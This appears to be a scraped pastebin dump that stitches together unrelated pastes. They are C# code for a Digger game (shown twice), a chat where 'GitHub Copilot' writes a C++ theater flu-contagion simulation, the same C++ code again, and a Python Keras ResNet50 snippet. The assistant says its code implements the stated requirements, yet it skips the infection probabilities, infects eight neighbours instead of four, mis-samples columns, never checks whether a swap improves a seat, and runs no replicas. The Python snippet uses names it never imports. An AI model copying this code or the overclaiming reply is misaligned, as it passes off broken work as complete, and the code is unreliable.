    }
}

public class Sack : ICreature
{
    private int counter = 0;
    public string GetImageFileName()
    {
        return ""Sack.png"";
    }

    public int GetDrawingPriority()
    {
        return 3;
    }

    public CreatureCommand Act(int x, int y)
    {
        if (y < Game.MapHeight - 1)
        {
            var map = Game.Map[x, y + 1];
            if (map == null ||
                (counter > 0 && (map.ToString() == ""Digger.Player"" ||
                map.ToString() == ""Digger.Monster"")))
            {
                counter++;
                return new CreatureCommand { DeltaX = 0, DeltaY = 1 };
            }
        }

        if (counter > 1)
        {
            counter = 0;
            return new CreatureCommand { DeltaX = 0, DeltaY = 0, TransformTo = new Gold() };
        }
        counter = 0;
        return new CreatureCommand { DeltaX = 0, DeltaY = 0};
    }

    public bool DeadInConflict(ICreature conflictedObject)
    {
        return false;
    }
}

public class Monster : ICreature
{
    public string GetImageFileName()
    {
        return ""Monster.png"";
    }

    public int GetDrawingPriority()
    {
        return 2;
    }

    public bool DeadInConflict(ICreature conflictedObject)
    {
        return conflictedObject is Sack || conflictedObject is Monster;
    }

    public CreatureCommand Act(int x, int y)
    {
        (var playerX, var playerY) = Player.GetCurrentPosition();
        if (playerX == -1)
            return new CreatureCommand { DeltaX = 0, DeltaY = 0 };;

        (var moveX, var moveY) = Player.GetMoveToPlayer(x, y, playerX, playerY);

        if (x + moveX != playerX || y + moveY != playerY - 1)
            return CanMonsterMoveTo(x, y, moveX, moveY)
                ? new CreatureCommand { DeltaX = 0, DeltaY = 0 }
                : new CreatureCommand { DeltaX = moveX, DeltaY = moveY };
        Game.Map[x + moveX, y + moveY] = null;
        return new CreatureCommand { DeltaX = 0, DeltaY = 0};
    }

    private static bool CanMonsterMoveTo(int x, int y, int moveX, int moveY)
    {
        var newX = x + moveX;
        var newY = y + moveY;

        var isOutsideMap = newX < 0 || newY < 0 || newX >= Game.MapWidth || newY >= Game.MapHeight;
        if (isOutsideMap)
            return true;

        var newPosition = Game.Map[newX, newY];

        return newPosition is Sack || newPosition is Monster || newPosition is Terrain;
    }
}

public class Player : ICreature
{
    public string GetImageFileName()
    {
        return ""Digger.png"";
    }

    public static (int, int) GetMoveToPlayer(int x, int y, int playerX, int playerY)
    {
        var deltaX = 0;
        var deltaY = 0;

        if (x != playerX)
        {
            deltaX = (x < playerX) ? 1 : -1;
        }
        else if (y != playerY)
        {
            deltaY = (y < playerY) ? 1 : -1;
        }

        return (deltaX, deltaY);
    }

    public bool DeadInConflict(ICreature conflictObj)
    {
        if (conflictObj is Gold)
        {
            Game.Scores += 10;
        }
        return conflictObj is Monster || conflictObj is Sack;
    }

    public int GetDrawingPriority()
    {
        return 1;
    }

    public static (int playerX, int playerY) GetCurrentPosition()
    {
        for (var i = 0; i < Game.MapWidth; i++)
        {
            for (var j = 0; j < Game.MapHeight; j++)
            {
                if (Game.Map[i, j] is Player)
                    return (i, j);
            }
        }

        return (-1, -1);
    }

    public CreatureCommand Act(int x, int y)
    {
        var key = Game.KeyPressed;
        var command = new CreatureCommand { DeltaX = 0, DeltaY = 0 };

        switch (key)
        {
            case Key.Down:
                if (y < Game.MapHeight - 1)
                {
                    command.DeltaY = 1;
                }
                break;

            case Key.Up:
                if (y > 0)
                {
                    command.DeltaY = -1;
                }
                break;

            case Key.Left:
                if (x > 0)
                {
                    command.DeltaX = -1;
                }
                break;

            case Key.Right:
                if (x < Game.MapWidth - 1)
                {
                    command.DeltaX = 1;
                }
                break;
        }

        if (Game.Map[x + command.DeltaX, y + command.DeltaY] is Sack)
        {
            return new CreatureCommand { DeltaX = 0, DeltaY = 0 };
        }

        return command;
    }
}

## Монстры

using System;
using System.Diagnostics.Metrics;
using System.Threading;
using Avalonia.Input;
using Digger.Architecture;

namespace Digger;

public class Terrain : ICreature
{
    public string GetImageFileName()
    {
        return ""Terrain.png"";
    }

    public bool DeadInConflict(ICreature conflictObj)
    {
        return true;
    }

    public int GetDrawingPriority()
    {
        return 0;
    }

    public CreatureCommand Act(int x, int y)
    {
        return new CreatureCommand { DeltaX = 0, DeltaY = 0 };
    }
}

public class Gold : ICreature
{
    public string GetImageFileName()
    {
        return ""Gold.png"";
    }

    public int GetDrawingPriority()
    {
        return 4;
    }

    public CreatureCommand Act(int x, int y)
    {
        return new CreatureCommand { DeltaX = 0, DeltaY = 0 } ;
    }

    public bool DeadInConflict(ICreature conflictObj)
    {
        return true;
    }
}

public class Sack : ICreature
{
    private int counter = 0;
    public string GetImageFileName()
    {
        return ""Sack.png"";
    }

    public int GetDrawingPriority()
    {
        return 3;
    }

    public CreatureCommand Act(int x, int y)
    {
        if (y < Game.MapHeight - 1)
        {
            var map = Game.Map[x, y + 1];
            if (map == null ||
                (counter > 0 && (map.ToString() == ""Digger.Player"" ||
                map.ToString() == ""Digger.Monster"")))
            {
                counter++;
                return new CreatureCommand() { DeltaX = 0, DeltaY = 1 };
            }
        }

        if (counter > 1)
        {
            counter = 0;
            return new CreatureCommand() { DeltaX = 0, DeltaY = 0, TransformTo = new Gold() };
        }
        counter = 0;
        return new CreatureCommand() { DeltaX = 0, DeltaY = 0};
    }

    public bool DeadInConflict(ICreature conflictedObject)
    {
        return false;
    }
}

public class Monster : ICreature
{
    public string GetImageFileName()
    {
        return ""Monster.png"";
    }

    public int GetDrawingPriority()
    {
        return 2;
    }

    public bool DeadInConflict(ICreature conflictedObject)
    {
        return conflictedObject is Sack || conflictedObject is Monster;
    }

    public CreatureCommand Act(int x, int y)
    {
        (var playerX, var playerY) = Player.GetCurrentPosition();
        if (playerX == -1)
            return new CreatureCommand();

        (var moveX, var moveY) = Player.GetMoveToPlayer(x, y, playerX, playerY);

        if (x + moveX != playerX || y + moveY != playerY - 1)
            return CanMonsterMoveTo(x, y, moveX, moveY)
                ? new CreatureCommand { DeltaX = 0, DeltaY = 0 }
                : new CreatureCommand { DeltaX = moveX, DeltaY = moveY };
        Game.Map[x + moveX, y + moveY] = null;
        return new CreatureCommand { DeltaX = 0, DeltaY = 0};
    }

    private static bool CanMonsterMoveTo(int x, int y, int moveX, int moveY)
    {
        var newX = x + moveX;
        var newY = y + moveY;

        var isOutsideMap = newX < 0 || newY < 0 || newX >= Game.MapWidth || newY >= Game.MapHeight;
        if (isOutsideMap)
            return true;

        var newPosition = Game.Map[newX, newY];

        return newPosition is Sack || newPosition is Monster || newPosition is Terrain;
    }
}

public class Player : ICreature
{
    public string GetImageFileName()
    {
        return ""Digger.png"";
    }

    public static (int, int) GetMoveToPlayer(int x, int y, int playerX, int playerY)
    {
        var deltaX = 0;
        var deltaY = 0;

        if (x != playerX)
        {
            deltaX = (x < playerX) ? 1 : -1;
        }
        else if (y != playerY)
        {
            deltaY = (y < playerY) ? 1 : -1;
        }

        return (deltaX, deltaY);
    }

    public bool DeadInConflict(ICreature conflictObj)
    {
        if (conflictObj is Gold)
        {
            Game.Scores += 10;
        }
        return conflictObj is Monster || conflictObj is Sack;
    }

    public int GetDrawingPriority()
    {
        return 1;
    }

    public static (int playerX, int playerY) GetCurrentPosition()
    {
        for (var i = 0; i < Game.MapWidth; i++)
        {
            for (var j = 0; j < Game.MapHeight; j++)
            {
                if (Game.Map[i, j] is Player)
                    return (i, j);
            }
        }

        return (-1, -1);
    }

    public CreatureCommand Act(int x, int y)
    {
        var key = Game.KeyPressed;
        var command = new CreatureCommand { DeltaX = 0, DeltaY = 0 };

        switch (key)
        {
            case Key.Down:
                if (y < Game.MapHeight - 1)
                {
                    command.DeltaY = 1;
                }
                break;

            case Key.Up:
                if (y > 0)
                {
                    command.DeltaY = -1;
                }
                break;

            case Key.Left:
                if (x > 0)
                {
                    command.DeltaX = -1;
                }
                break;

            case Key.Right:
                if (x < Game.MapWidth - 1)
                {
                    command.DeltaX = 1;
                }
                break;
        }

        if (Game.Map[x + command.DeltaX, y + command.DeltaY] is Sack)
        {
            return new CreatureCommand { DeltaX = 0, DeltaY = 0 };
        }

        return command;
    }
}"
TM6m140y,Untitled,teofarov13,C++,Sunday 24th of December 2023 07:37:10 AM CDT,"

MihailTeofarov: Fever at the Opera Haus
In February, Gaetano Donizzetti's L'elisir d'amore is staged at the Vienna State Opera. The map
of the theater is schematized in the in_theatre.dat file: 0s correspond to aisles, 1s to either empty
seats or seats occupied by people in full health, 2s to people vaccinated against the flu, 3s and 4s
to sick people (a little or a lot sick, respectively). During the show someone may try to improve
his or her position: keep in mind that the stage is positioned after the last row of the seating plan
and that a spectator's position improves if and only if 1. he or she moves closer to the stage and
2. moves away from the edges. During the duration of the show, the few people with the flu may
infect their direct first neighbors (up-down/left-right), and at the end of the show some spectators
will return home less healthy than before. How many?

GitHub Copilot: It seems like you're trying to simulate the spread of a disease in a theater. Here's a high-level plan:

1. Load the theater map from the `in_theatre.dat` file. Each number in the file represents a different state of health or type of seat.
2. Create a function to calculate the distance of each seat from the stage and the edges. This will be used to determine if a spectator's position improves.
3. Create a function to simulate the spread of the disease. This function should iterate over each seat and, if the seat is

MihailTeofarov: Write a cpp code that:
1. reads the theater map: you have 3 different seating configurations (_nv, _v and _sv) with
which you might observe the effect of the presence and distribution of the vaccinated people
2. implements the contagion: select a random seat, if it is occupied by a sick person then
propose a contagion for each of the 4 nearest neighbors, the probability of infecting a nearby
person is 10% for mildly sick spectators and 30% for heavily sick spectators (note: 3s
transform 1s into 3s, while 4s transform both 1s and 3s into 4s, in the infection dynamics all
1s are supposed to be healthy people); repeat this dynamics for the duration of the
performance (1000 time steps)
3. implements the swapping: select a random person once every 10 time steps, propose a
random swap and accept the proposed move only if 1. the candidate seat is marked as 1 (in
the swapping dynamics 1s can be either free seats or healthy spectators, do not worry about
any distinction) and 2. it is an improvement
4. accumulates a little statistics before drawing conclusions: the opera runs throughout
February, each night is independent of the previous one because no spectator wants to see the
same opera twice in one month.
5. outputs in one file the number (or — better — the percentage) of 1. empty/healthy seats 2.
vaccinated people (it should be constant!), 3. mildly sick people and 4. heavily sick people
for every replica of the show.
The

GitHub Copilot: Here is a C++ code that implements the requirements you've described. 

```cpp
#include <iostream>
#include <fstream>
#include <vector>
#include <random>
#include <algorithm>

// Constants
const int TIME_STEPS = 1000;
const int SWAP_INTERVAL = 10;
const int HEALTHY = 1;
const int VACCINATED = 2;
const int MILDLY_SICK = 3;
const int HEAVILY_SICK = 4;

// Function to simulate contagion
void simulateContagion(std::vector<std::vector<int>>& seatingPlan, std::default_random_engine& generator) {
    std::uniform_int_distribution<int> distribution(0, seatingPlan.size() - 1);
    for (int i = 0; i < TIME_STEPS; i++) {
        int row = distribution(generator);
        int col = distribution(generator);
        if (seatingPlan[row][col] == MILDLY_SICK || seatingPlan[row][col] == HEAVILY_SICK) {
            // Propose contagion for each of the 4 nearest neighbors
            for (int j = std::max(0, row - 1); j <= std::min((int)seatingPlan.size() - 1, row + 1); j++) {
                for (int k = std::max(0, col - 1); k <= std::min((int)seatingPlan[j].size() - 1, col + 1); k++) {
                    if (j != row || k != col) {
                        if (seatingPlan[j][k] == HEALTHY) {
                            seatingPlan[j][k] = seatingPlan[row][col] == MILDLY_SICK ? MILDLY_SICK : HEAVILY_SICK;
                        }
                    }
                }
            }
        }
    }
}

// Function to simulate swapping
void simulateSwapping(std::vector<std::vector<int>>& seatingPlan, std::default_random_engine& generator) {
    std::uniform_int_distribution<int> distribution(0, seatingPlan.size() - 1);
    for (int i = 0; i < TIME_STEPS; i++) {
        if (i % SWAP_INTERVAL == 0) {
            int row1 = distribution(generator);
            int col1 = distribution(generator);
            int row2 = distribution(generator);
            int col2 = distribution(generator);
            if (seatingPlan[row1][col1] != HEALTHY && seatingPlan[row2][col2] == HEALTHY) {
                std::swap(seatingPlan[row1][col1], seatingPlan[row2][col2]);
            }
        }
    }
}

// Function to calculate statistics
void calculateStatistics(const std::vector<std::vector<int>>& seatingPlan, std::ofstream& file) {
    int totalSeats = seatingPlan.size() * seatingPlan[0].size();
    int emptySeats = 0;
    int vaccinated = 0;
    int mildlySick = 0;
    int heavilySick = 0;
    for (const auto& row : seatingPlan) {
        for (int seat : row) {
            switch (seat) {
                case HEALTHY:
                    emptySeats++;
                    break;
                case VACCINATED:
                    vaccinated++;
                    break;
                case MILDLY_SICK:
                    mildlySick++;
                    break;
                case HEAVILY_SICK:
                    heavilySick++;
                    break;
            }
        }
    }
    file << ""Empty/Healthy seats: "" << (double)emptySeats / totalSeats * 100 << ""%\n"";
    file << ""Vaccinated people: "" << (double)vaccinated / totalSeats * 100 << ""%\n"";
    file << ""Mildly sick people: "" << (double)mildlySick / totalSeats * 100 << ""%\n"";
    file << ""Heavily sick people: "" << (double)heavilySick / totalSeats * 100 << ""%\n"";
}

int main() {
    std::ifstream file(""in_theatre.dat"");
    std::ofstream outFile(""out_theatre.dat"");
    std::vector<std::vector<int>> seatingPlan;

    // Read seating plan from file
    std::string line;
    while (std::getline(file, line)) {
        std::vector<int> row;
        for (char c : line) {
            row.push_back(c - '0');
        }
        seatingPlan.push_back(row);
    }

    // Initialize random number generator
    std::default_random_engine generator;

    // Simulate contagion and swapping
    simulateContagion(seatingPlan, generator);
    simulateSwapping(seatingPlan, generator);

    // Calculate and output statistics
    calculateStatistics(seatingPlan, outFile);

    return 0;
}
```

This code reads the seating plan from a file, simulates the contagion and swapping dynamics, and then calculates and outputs the statistics to another file. The contagion and swapping dynamics are simulated using a random number generator. The statistics are calculated by counting the number of each type of seat and then outputting the percentages."
9AjQzMNS,Untitled,VeraMelnikova,Python,Sunday 24th of December 2023 07:33:22 AM CDT,"from tensorflow.keras.datasets import fashion_mnist
from tensorflow.keras.layers import Dense, Conv2D, Flatten, AvgPool2D
from tensorflow.keras.preprocessing.image import ImageDataGenerator

from tensorflow.keras.models import Sequential
from tensorflow.keras.optimizers import Adam
import numpy as np
 
def load_train(path):
    datagen = ImageDataGenerator(
        horizontal_flip=True,
        vertical_flip=True,
        rescale=1/255.)

    train_datagen_flow = datagen.flow_from_directory(
        path,
        target_size=(150, 150),
        batch_size=16,
        class_mode='sparse',
        seed=12345)

    return train_datagen_flow

def create_model(input_shape):
    backbone = ResNet50(input_shape=(150, 150, 3),
                    weights='imagenet',
                    include_top=False) 

    # замораживаем ResNet50 без верхушки
    # backbone.trainable = False

    model = Sequential()
    model.add(backbone)
    model.add(GlobalAveragePooling2D())
    model.add(Dense(12, activation='softmax'))
    optimizer = Adam(lr=0.0001) 
    model.compile(optimizer=optimizer, loss='sparse_categorical_crossentropy', metrics=['acc'])
 
    return model


def train_model(model, train_data, test_data, batch_size=None, epochs=3,
               steps_per_epoch=None, validation_steps=None):

    model.fit(train_data,
              validation_data=test_data,
              batch_size=batch_size, epochs=epochs,
              steps_per_epoch=steps_per_epoch,
              validation_steps=validation_steps,
              verbose=2, shuffle=True)
 
    return model"
Cu5dE5mE,Untitled,teofarov13,C++,Sunday 24th of December 2023 07:32:51 AM CDT,"#include <iostream>
#include <fstream>
#include <vector>
#include <random>
#include <algorithm>

// Constants
const int TIME_STEPS = 1000;
const int SWAP_INTERVAL = 10;
const int HEALTHY = 1;
const int VACCINATED = 2;
const int MILDLY_SICK = 3;
const int HEAVILY_SICK = 4;

// Function to simulate contagion
void simulateContagion(std::vector<std::vector<int>>& seatingPlan, std::default_random_engine& generator) {
    std::uniform_int_distribution<int> distribution(0, seatingPlan.size() - 1);
    for (int i = 0; i < TIME_STEPS; i++) {
        int row = distribution(generator);
        int col = distribution(generator);
        if (seatingPlan[row][col] == MILDLY_SICK || seatingPlan[row][col] == HEAVILY_SICK) {
            // Propose contagion for each of the 4 nearest neighbors
            for (int j = std::max(0, row - 1); j <= std::min((int)seatingPlan.size() - 1, row + 1); j++) {
                for (int k = std::max(0, col - 1); k <= std::min((int)seatingPlan[j].size() - 1, col + 1); k++) {
                    if (j != row || k != col) {
                        if (seatingPlan[j][k] == HEALTHY) {
                            seatingPlan[j][k] = seatingPlan[row][col] == MILDLY_SICK ? MILDLY_SICK : HEAVILY_SICK;
                        }
                    }
                }
            }
        }
    }
}

// Function to simulate swapping
void simulateSwapping(std::vector<std::vector<int>>& seatingPlan, std::default_random_engine& generator) {
    std::uniform_int_distribution<int> distribution(0, seatingPlan.size() - 1);
    for (int i = 0; i < TIME_STEPS; i++) {
        if (i % SWAP_INTERVAL == 0) {
            int row1 = distribution(generator);
            int col1 = distribution(generator);
            int row2 = distribution(generator);
            int col2 = distribution(generator);
            if (seatingPlan[row1][col1] != HEALTHY && seatingPlan[row2][col2] == HEALTHY) {
                std::swap(seatingPlan[row1][col1], seatingPlan[row2][col2]);
            }
        }
    }
}

// Function to calculate statistics
void calculateStatistics(const std::vector<std::vector<int>>& seatingPlan, std::ofstream& file) {
    int totalSeats = seatingPlan.size() * seatingPlan[0].size();
    int emptySeats = 0;
    int vaccinated = 0;
    int mildlySick = 0;
    int heavilySick = 0;
    for (const auto& row : seatingPlan) {
        for (int seat : row) {
            switch (seat) {
                case HEALTHY:
                    emptySeats++;
                    break;
                case VACCINATED:
                    vaccinated++;
                    break;
                case MILDLY_SICK:
                    mildlySick++;
                    break;
                case HEAVILY_SICK:
                    heavilySick++;
                    break;
            }
        }
    }
    file << ""Empty/Healthy seats: "" << (double)emptySeats / totalSeats * 100 << ""%\n"";
    file << ""Vaccinated people: "" << (double)vaccinated / totalSeats * 100 << ""%\n"";
    file << ""Mildly sick people: "" << (double)mildlySick / totalSeats * 100 << ""%\n"";
    file << ""Heavily sick people: "" << (double)heavilySick / totalSeats * 100 << ""%\n"";
}

int main() {
    std::ifstream file(""in_theatre.dat"");
    std::ofstream outFile(""out_theatre.dat"");
    std::vector<std::vector<int>> seatingPlan;

    // Read seating plan from file
    std::string line;
    while (std::getline(file, line)) {
        std::vector<int> row;
        for (char c : line) {
            row.push_back(c - '0');
        }
        seatingPlan.push_back(row);
    }

    // Initialize random number generator
    std::default_random_engine generator;

    // Simulate contagion and swapping
    simulateContagion(seatingPlan, generator);
    simulateSwapping(seatingPlan, generator);

    // Calculate and output statistics
    calculateStatistics(seatingPlan, outFile);

    return 0;
}"
